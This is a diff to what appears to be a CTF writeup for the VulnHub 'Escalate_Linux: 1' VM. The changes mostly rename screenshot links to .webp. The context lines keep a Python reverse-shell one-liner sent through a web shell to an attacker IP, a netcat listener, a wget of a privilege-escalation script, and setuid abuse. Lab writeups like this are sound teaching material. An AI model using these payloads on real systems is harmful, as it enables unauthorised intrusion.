@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Escalate_Linux: 1](https://www.vulnhub.com/entry/escalate_linux-1,323/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_escalatelinux/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_escalatelinux/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -150,9 +150,9 @@ nc -nlvp 9999
 http://192.168.92.173/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.92.163",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_escalatelinux/screenshot01.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_escalatelinux/screenshot01.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_escalatelinux/screenshot02.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_escalatelinux/screenshot02.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -200,26 +200,26 @@ wget http://192.168.92.163:8000/linuxprivchecker.py ; chmod +x ./linuxprivchecke
 /home/user5/script → setuid
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_escalatelinux/screenshot03.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_escalatelinux/screenshot03.png.webp)  
 
-![writeup.privesc.steps.2.2](/static/files/posts_vulnhub_escalatelinux/screenshot04.png)  
+![writeup.privesc.steps.2.2](/static/files/posts_vulnhub_escalatelinux/screenshot04.png.webp)  
 
-![writeup.privesc.steps.2.3](/static/files/posts_vulnhub_escalatelinux/screenshot05.png)  
+![writeup.privesc.steps.2.3](/static/files/posts_vulnhub_escalatelinux/screenshot05.png.webp)  
 
 3\. From `linenum.sh` scan, we find that the MySQL service allows login with the default credentials `root/root`. We use this to connect and get credentials for the `mysql` user:  
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_escalatelinux/screenshot07.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_escalatelinux/screenshot07.png.webp)  
 
-![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_escalatelinux/screenshot07a.png)  
+![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_escalatelinux/screenshot07a.png.webp)  
 
 4\. We investigate the `setuid` files now. Since the first `setuid` file `/home/user3/shell` is owned by `user3`, we checkout their `.bash_history` to see possible usage commands:  
 ```
 cat /home/user3/.bash_history
 ```
 
-![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_escalatelinux/screenshot08.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_escalatelinux/screenshot08.png.webp)  
 
-![writeup.privesc.steps.4.2](/static/files/posts_vulnhub_escalatelinux/screenshot08a.png)  
+![writeup.privesc.steps.4.2](/static/files/posts_vulnhub_escalatelinux/screenshot08a.png.webp)  
 
 5\. We find that the `/home/user3/shell` file requries a `.script.sh` file and needs it to have executable permissions. We create this file and test out the `shell` file which gives us an elevated shell:  
 ```
@@ -228,7 +228,7 @@ chmod +x ./.script.sh
 /home/user3/shell
 ```
 
-![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_escalatelinux/screenshot09.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_escalatelinux/screenshot09.png.webp)  
 
 ## Loot
 ### Hashes
